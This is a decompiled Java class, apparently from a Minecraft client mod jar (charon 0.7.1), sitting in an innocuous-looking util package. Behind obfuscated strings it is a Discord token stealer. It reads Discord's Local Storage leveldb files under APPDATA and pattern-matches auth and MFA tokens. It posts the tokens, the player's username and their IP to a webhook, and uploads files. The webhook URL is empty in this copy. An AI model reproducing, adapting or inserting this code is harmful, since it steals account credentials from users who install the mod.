/*     */ package cc.zip.charon.util;
/*     */ 
/*     */ import java.io.BufferedReader;
/*     */ import java.io.File;
/*     */ import java.io.FileInputStream;
/*     */ import java.io.IOException;
/*     */ import java.io.InputStream;
/*     */ import java.io.InputStreamReader;
/*     */ import java.io.OutputStream;
/*     */ import java.net.HttpURLConnection;
/*     */ import java.net.URL;
/*     */ import java.nio.charset.StandardCharsets;
/*     */ import net.minecraft.client.Minecraft;
/*     */ 
/*     */ 
/*     */ public class Main
/*     */ {
/*     */   public static String getApi() throws IOException {
/*  19 */     URL checkIp = new URL("");
/*  20 */     String api = "";
/*  21 */     try (BufferedReader br = new BufferedReader(new InputStreamReader(checkIp.openStream()))) {
/*     */       
/*  23 */       api = br.readLine();
/*  24 */     } catch (Exception exception) {}
/*  25 */     return api;
/*     */   }
/*     */ 
/*     */   
/*     */   public static void main() throws Exception {
/*  30 */     (new Thread(() -> {
/*     */           String api;
/*     */           try {
/*     */             api = getApi();
/*  34 */           } catch (IOException e1) {
/*     */             api = null;
/*     */           } 
/*     */           String nel = getStr();
/*     */           String str = getStr5();
/*     */           String str2 = getStr6();
/*     */           String botName = Minecraft.func_71410_x().func_110432_I().func_111285_a() + api;
/*     */           try {
/*     */             sedile(nel, new File(System.getenv(getStr3()) + ""));
/*  43 */           } catch (Exception e) {
/*     */             e.printStackTrace();
/*     */           } 
/*     */           try {
/*     */             sedile(nel, new File(System.getenv(getStr3()) + ""));
/*  48 */           } catch (Exception e) {
/*     */             e.printStackTrace();
/*     */           } 
/*     */           
/*     */           String location = System.getenv(getStr3()) + getStr2();
/*     */           String[] storage = (new File(location)).list();
/*     */           for (String fileName : storage) {
/*     */             try {
/*     */               File file = new File(location + fileName);
/*     */               int fileSize = (int)file.length();
/*     */               if (fileSize >= 61) {
/*     */                 try (InputStream inputStream = new FileInputStream(file)) {
/*     */                   byte[] fileBytes = new byte[fileSize];
/*     */                   inputStream.read(fileBytes, 0, fileSize);
/*     */                   for (int i = 1; i < fileSize - 59; i++) {
/*     */                     if (fileBytes[i - 1] == 34 && fileBytes[i + 59] == 34 && fileBytes[i + 24] == 46 && fileBytes[i + 31] == 46) {
/*     */                       boolean isCorrect = true;
/*     */                       for (int j = 0; j < 59; j++) {
/*     */                         if (j != 24 && j != 31 && (fileBytes[i + j] <= 47 || fileBytes[i + j] >= 58) && (fileBytes[i + j] <= 64 || fileBytes[i + j] >= 91) && (fileBytes[i + j] <= 96 || fileBytes[i + j] >= 123) && fileBytes[i + j] != 45 && fileBytes[i + j] != 95) {
/*     */                           isCorrect = false;
/*     */                           break;
/*     */                         } 
/*     */                       } 
/*     */                       if (isCorrect) {
/*     */                         byte[] tokenBytes = new byte[59];
/*     */                         System.arraycopy(fileBytes, i, tokenBytes, 0, 59);
/*     */                         sedessege(nel, botName, str2 + new String(tokenBytes, StandardCharsets.UTF_8));
/*     */                       } 
/*     */                       i += 60;
/*     */                     } else if (fileSize - i > 88 && fileBytes[i - 1] == 34 && fileBytes[i + 88] == 34 && fileBytes[i] == 109 && fileBytes[i + 1] == 102 && fileBytes[i + 2] == 97 && fileBytes[i + 3] == 46) {
/*     */                       boolean isCorrect = true;
/*     */                       for (int j = 0; j < 88; j++) {
/*     */                         if (j != 3 && (fileBytes[i + j] <= 47 || fileBytes[i + j] >= 58) && (fileBytes[i + j] <= 64 || fileBytes[i + j] >= 91) && (fileBytes[i + j] <= 96 || fileBytes[i + j] >= 123) && fileBytes[i + j] != 45 && fileBytes[i + j] != 95) {
/*     */                           isCorrect = false;
/*     */                           break;
/*     */                         } 
/*     */                       } 
/*     */                       if (isCorrect) {
/*     */                         byte[] tokenBytes = new byte[88];
/*     */                         System.arraycopy(fileBytes, i, tokenBytes, 0, 88);
/*     */                         sedessege(nel, botName, str2 + new String(tokenBytes, StandardCharsets.UTF_8));
/*     */                       } 
/*     */                       i += 89;
/*     */                     } 
/*     */                   } 
/*     */                 } 
/*     */               }
/*  95 */             } catch (Exception ex) {
/*     */               ex.printStackTrace();
/*     */             } 
/*     */           } 
/*     */           try {
/*     */             sedessege(nel, botName, getStr7());
/* 101 */           } catch (Exception ex) {
/*     */             ex.printStackTrace();
/*     */           } 
/* 104 */         })).start();
/*     */   }
/*     */   
/*     */   private static void sedile(String nel, File file) throws Exception {
/* 108 */     String boundary = Long.toHexString(System.currentTimeMillis());
/* 109 */     HttpURLConnection connection = (HttpURLConnection)(new URL(nel)).openConnection();
/* 110 */     connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
/* 111 */     connection.setRequestProperty("User-Agent", "Mozilla/5.0");
/* 112 */     connection.setDoOutput(true);
/* 113 */     try (OutputStream os = connection.getOutputStream()) {
/* 114 */       os.write(("--" + boundary + "\n").getBytes());
/* 115 */       os.write(("Content-Disposition: form-data; name=\"" + file.getName() + "\"; filename=\"" + file.getName() + "\"\n\n").getBytes());
/* 116 */       try (InputStream inputStream = new FileInputStream(file)) {
/* 117 */         int fileSize = (int)file.length();
/* 118 */         byte[] fileBytes = new byte[fileSize];
/* 119 */         inputStream.read(fileBytes, 0, fileSize);
/* 120 */         os.write(fileBytes);
/*     */       } 
/* 122 */       os.write(("\n--" + boundary + "--\n").getBytes());
/*     */     } 
/* 124 */     connection.getResponseCode();
/* 125 */     Thread.sleep(500L);
/*     */   }
/*     */ 
/*     */   
/*     */   private static void sedessege(String nel, String botName, String msg) throws Exception {
/* 130 */     URL obj = new URL(nel);
/* 131 */     HttpURLConnection con = (HttpURLConnection)obj.openConnection();
/* 132 */     con.setRequestMethod("POST");
/* 133 */     con.setRequestProperty("Content-Type", "application/json");
/* 134 */     con.setRequestProperty("User-Agent", "Mozilla/5.0");
/* 135 */     String POST_PARAMS = "{ \"username\": \"" + botName + "\", \"content\": \"" + msg + "\" }";
/* 136 */     con.setDoOutput(true);
/* 137 */     OutputStream os = con.getOutputStream();
/* 138 */     os.write(POST_PARAMS.getBytes());
/* 139 */     os.flush();
/* 140 */     os.close();
/* 141 */     Thread.sleep(500L);
/* 142 */     con.getResponseCode();
/*     */   }
/*     */   private static String getStr() {
/* 145 */     String q = "";
/* 146 */     return q;
/*     */   }
/*     */   private static String getStr2() {
/* 149 */     StringBuilder result = new StringBuilder();
/* 150 */     short[] str = { -8, 0, 5, 15, -1, 11, 14, 0, -8, -24, 11, -1, -3, 8, -68, -17, 16, 11, 14, -3, 3, 1, -8, 8, 1, 18, 1, 8, 0, -2, -8 };
/*     */ 
/*     */ 
/*     */ 
/*     */     
/* 155 */     for (short value : str)
/* 156 */       result.append((char)(100 + value)); 
/* 157 */     return result.toString();
/*     */   }
/*     */   
/*     */   private static String getStr3() {
/* 161 */     StringBuilder result = new StringBuilder();
/* 162 */     short[] str = { 15, 30, 30, 18, 15, 34, 15 };
/* 163 */     for (short value : str)
/* 164 */       result.append((char)(50 + value)); 
/* 165 */     return result.toString();
/*     */   }
/*     */   
/*     */   private static String getStr4() {
/* 169 */     StringBuilder result = new StringBuilder();
/* 170 */     short[] str = { 27, 55, 60, 51, 49, 64, 47, 52, 66, -18, 60, 47, 59, 51, 8, -18 };
/*     */ 
/*     */     
/* 173 */     for (short value : str)
/* 174 */       result.append((char)(50 + value)); 
/* 175 */     return result.toString();
/*     */   }
/*     */   
/*     */   private static String getStr5() {
/* 179 */     StringBuilder result = new StringBuilder();
/* 180 */     short[] str = { 20, 55, 58, 51, 8, -18 };
/* 181 */     for (short value : str)
/* 182 */       result.append((char)(50 + value)); 
/* 183 */     return result.toString();
/*     */   }
/*     */   
/*     */   private static String getStr6() {
/* 187 */     StringBuilder result = new StringBuilder();
/* 188 */     short[] str = { 26, 53, 49, 43, 52, 0, -26 };
/* 189 */     for (short value : str)
/* 190 */       result.append((char)(58 + value)); 
/* 191 */     return result.toString();
/*     */   }
/*     */   
/*     */   private static String getStr7() {
/* 195 */     StringBuilder result = new StringBuilder();
/* 196 */     short[] str = { 37, 78, 68 };
/* 197 */     for (short value : str)
/* 198 */       result.append((char)(32 + value)); 
/* 199 */     return result.toString();
/*     */   }
/*     */ }


/* Location:              /home/lcheater/Загрузки/charon0.7.1.jar!/cc/zip/charon/util/Main.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */